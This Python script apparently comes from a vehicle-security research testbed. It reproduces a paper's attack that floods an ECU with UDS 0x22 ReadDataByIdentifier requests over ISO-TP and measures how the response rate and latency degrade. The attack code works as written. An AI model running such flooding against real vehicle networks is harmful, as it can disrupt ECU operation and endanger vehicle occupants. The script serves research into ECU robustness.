"""0x22 ReadDataByIdentifier overload attack (paper Section V-A).

Floods a target ECU with back-to-back UDS 0x22 (ReadDataByIdentifier)
requests at a configurable interval and measures whether the ECU keeps
answering. The paper swept 0.1-0.6ms request spacing against real ECUs and
watched their *periodic* CAN traffic collapse under load; this testbed's
reference ECUs don't emit periodic traffic, so the observable proxy here is
the 0x22 response rate and round-trip latency at each interval -- a slower,
less complete, or dropped reply is the same "diagnostic processing crowds
out other work" effect the paper measured, just read off the request/response
channel instead of a background broadcast.

Usage:
    python3 attacks/overload_0x22.py --interface vcan0 --sweep-ms 0.5,1,2,5 --duration 3
"""

from __future__ import annotations

import argparse
import socket as socket_module
import statistics
import time
from dataclasses import dataclass


def build_read_by_id(did: int) -> bytes:
    return bytes([0x22, (did >> 8) & 0xFF, did & 0xFF])


@dataclass
class IntervalResult:
    interval_ms: float
    sent: int
    answered: int
    latencies_ms: list

    @property
    def response_rate(self) -> float:
        return self.answered / self.sent if self.sent else 0.0

    @property
    def avg_latency_ms(self) -> float:
        return statistics.mean(self.latencies_ms) if self.latencies_ms else float("nan")


def summarize(interval_ms: float, samples: list) -> IntervalResult:
    """samples: list of (answered: bool, latency_ms: float | None)."""
    answered = [lat for ok, lat in samples if ok and lat is not None]
    return IntervalResult(interval_ms=interval_ms, sent=len(samples), answered=len(answered), latencies_ms=answered)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--interface", default="vcan0")
    parser.add_argument("--rx-id", type=lambda x: int(x, 0), default=0x7E8, help="ECU's response CAN ID")
    parser.add_argument("--tx-id", type=lambda x: int(x, 0), default=0x7E0, help="ECU's request CAN ID")
    parser.add_argument("--did", type=lambda x: int(x, 0), default=0xF190, help="target DataIdentifier")
    parser.add_argument(
        "--sweep-ms",
        default="0.1,0.2,0.3,0.4,0.5,0.6",
        help="comma-separated request intervals in milliseconds, tried in order",
    )
    parser.add_argument("--duration", type=float, default=2.0, help="seconds of flooding per interval")
    parser.add_argument("--response-timeout", type=float, default=0.05, help="per-request wait for a response, seconds")
    return parser.parse_args()


def run_interval(sock, did: int, interval_ms: float, duration: float, response_timeout: float) -> IntervalResult:
    request = build_read_by_id(did)
    samples = []
    deadline = time.monotonic() + duration
    next_send = time.monotonic()
    sock.settimeout(response_timeout)
    while time.monotonic() < deadline:
        now = time.monotonic()
        if now < next_send:
            time.sleep(next_send - now)
        sent_at = time.monotonic()
        sock.send(request)
        try:
            resp = sock.recv()
        except socket_module.timeout:
            resp = None
        if resp:
            latency_ms = (time.monotonic() - sent_at) * 1000
            samples.append((True, latency_ms))
        else:
            samples.append((False, None))
        next_send = sent_at + interval_ms / 1000.0
    return summarize(interval_ms, samples)


def main() -> None:
    import isotp

    args = parse_args()
    intervals = [float(x) for x in args.sweep_ms.split(",")]

    sock = isotp.socket()
    sock.bind(args.interface, isotp.Address(rxid=args.rx_id, txid=args.tx_id))
    print(f"Flooding 0x22 DID=0x{args.did:04X} on {args.interface} (tx=0x{args.tx_id:03X}, rx=0x{args.rx_id:03X})")

    print(f"{'interval(ms)':>13} {'sent':>6} {'answered':>9} {'rate':>7} {'avg latency(ms)':>16}")
    for interval_ms in intervals:
        result = run_interval(sock, args.did, interval_ms, args.duration, args.response_timeout)
        print(
            f"{result.interval_ms:>13.2f} {result.sent:>6} {result.answered:>9} "
            f"{result.response_rate * 100:>6.1f}% {result.avg_latency_ms:>16.2f}"
        )


if __name__ == "__main__":
    main()
